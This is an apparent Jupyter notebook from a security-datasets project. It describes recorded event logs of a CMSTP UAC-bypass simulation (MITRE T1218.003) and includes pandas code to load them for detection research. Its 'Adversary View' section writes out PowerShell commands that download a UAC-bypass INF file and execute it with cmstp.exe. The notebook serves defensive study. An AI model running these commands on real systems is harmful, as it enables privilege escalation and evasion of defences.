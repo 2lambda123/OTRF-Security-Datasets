{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "2d2fb654",
   "metadata": {},
   "source": [
    "# CMSTP Proxy Execution"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "88885617",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f06e0fa6",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/10/22 |\n",
    "| Modification Date | 2020/10/22 |\n",
    "| Tactics           | [TA0005](https://attack.mitre.org/tactics/TA0005) |\n",
    "| Techniques        | [T1218.003](https://attack.mitre.org/techniques/T1218/003) |\n",
    "| Tags              | art.748cb4f6-2fb3-4e97-b7ad-b22635a09ab0 |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b7276798",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents threat actors leveraging CMSTP to execute an Inf file to proxy execute other malicious commands (i.e. cmd.exe). (Embedding commands in the RunPreSetupCommandsSection of the INF file)."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5bd8d930",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "95e9a187",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ac317ce3",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "63a0be09",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f77b1ae0",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| Manual | powershell | [powershell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6a57f694",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf\" -OutFile C:\\ProgramData\\T1218.003_uacbypass.inf\n",
    "cmstp.exe /s C:\\ProgramData\\T1218.003_uacbypass.inf /au\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d374e19a",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "489afe4e",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "202a67b6",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "530aa8ad",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7a64bba",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "98da5260",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b4f79eb3",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8dbcb657",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
